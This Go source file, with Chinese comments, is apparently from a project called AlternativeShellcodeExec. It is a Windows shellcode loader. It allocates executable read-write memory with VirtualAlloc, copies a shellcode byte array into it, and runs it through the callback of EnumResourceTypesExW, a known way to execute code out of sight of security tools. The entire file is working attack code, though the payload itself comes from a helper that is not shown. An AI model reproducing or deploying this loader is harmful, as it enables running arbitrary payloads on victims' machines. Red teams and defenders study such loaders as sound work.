package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE) // 使用 0x2000 代替 MEM_RESERVE，0x1000 代替 MEM_COMMIT，0x40 代替 PAGE_EXECUTE_READWRITE

	// 处理 op 数组
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// 加载 Kernel32.dll 库
	loadLibrary, _ := kernel32.FindProc("LoadLibraryW")
	kernel32Dll, _, err := loadLibrary.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("Kernel32.dll"))))
	if kernel32Dll == 0 {
		fmt.Printf("LoadLibraryW failed: %v\n", err)
		return
	}

	// 使用 EnumResourceTypesExW 调用 shellcode
	enumResourceTypesExW, _ := kernel32.FindProc("EnumResourceTypesExW")
	ret, _, err := enumResourceTypesExW.Call(kernel32Dll, addr, 0, 0x08, 0) // 使用 0x08 代替 RESOURCE_ENUM_VALIDATE
	if ret == 0 {
		fmt.Printf("EnumResourceTypesExW failed: %v\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
